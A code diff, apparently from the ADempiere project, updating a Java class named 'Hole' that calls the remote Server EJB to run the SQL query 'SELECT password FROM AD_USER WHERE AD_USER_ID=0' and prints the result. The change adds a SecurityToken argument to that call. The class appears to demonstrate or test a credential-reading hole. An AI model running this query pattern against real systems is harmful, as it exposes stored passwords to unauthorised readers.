@@ -9,6 +9,7 @@ import javax.sql.RowSet;
 import org.compiere.interfaces.Server;
 import org.compiere.interfaces.ServerHome;
 import org.compiere.util.CStatementVO;
+import org.compiere.util.SecurityToken;
 
 public class Hole {
     
@@ -28,7 +29,7 @@ public class Hole {
             ServerHome serverHome = (ServerHome)ctx.lookup("adempiere/Server");
             Server server = serverHome.create();
             CStatementVO cs = new CStatementVO(1, 1, "SELECT password FROM AD_USER WHERE AD_USER_ID=0;");
-            RowSet s = server.stmt_getRowSet(cs);
+            RowSet s = server.stmt_getRowSet(cs, SecurityToken.getInstance());
             s.next();
             System.out.println(s.getString(1));
 
